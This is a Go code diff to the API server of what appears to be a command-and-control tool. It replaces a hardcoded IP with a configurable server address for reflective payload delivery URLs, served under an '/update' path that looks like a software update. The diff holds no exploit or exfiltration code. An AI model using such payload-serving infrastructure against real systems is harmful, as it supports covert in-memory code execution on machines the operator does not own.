@@ -24,10 +24,12 @@ type APIServer struct {
 	wsServer    *WebSocketServer
 	httpServer  *http.Server
 	httpsServer *https_server.HTTPSServer
+	serverIP    string // External IP/hostname for payload URLs
 }
 
 // NewAPIServer creates a new API server
-func NewAPIServer(db *server.Database, ntpServer *server.NTPServer, port int) *APIServer {
+// serverIP is the external IP/hostname used for payload delivery URLs (can be empty if reflective loading not used)
+func NewAPIServer(db *server.Database, ntpServer *server.NTPServer, port int, serverIP string) *APIServer {
 	router := mux.NewRouter()
 
 	wsServer := NewWebSocketServer(db, ntpServer)
@@ -49,6 +51,7 @@ func NewAPIServer(db *server.Database, ntpServer *server.NTPServer, port int) *A
 			Handler: router,
 		},
 		httpsServer: httpsServer,
+		serverIP:    serverIP,
 	}
 
 	// Set the APIServer reference in WebSocketServer
@@ -281,6 +284,11 @@ func (s *APIServer) handleGroupAgent(w http.ResponseWriter, r *http.Request) {
 
 // RegisterReflectivePayload registers a payload for reflective loading
 func (s *APIServer) RegisterReflectivePayload(payloadData []byte, functionName string) (string, string, error) {
+	// Validate server IP is configured
+	if s.serverIP == "" {
+		return "", "", fmt.Errorf("server IP not configured; use -server-ip flag when starting the server")
+	}
+
 	// Generate a random payload ID
 	idBytes := make([]byte, 16)
 	if _, err := rand.Read(idBytes); err != nil {
@@ -291,8 +299,8 @@ func (s *APIServer) RegisterReflectivePayload(payloadData []byte, functionName s
 	// Register the payload with the HTTPS server
 	s.httpsServer.RegisterPayload(payloadID, payloadData, functionName)
 
-	// Construct the complete URL
-	serverURL := fmt.Sprintf("https://192.168.2.124:443/update?id=%s", payloadID)
+	// Construct the complete URL using configured server IP
+	serverURL := fmt.Sprintf("https://%s:443/update?id=%s", s.serverIP, payloadID)
 
 	return payloadID, serverURL, nil
 }
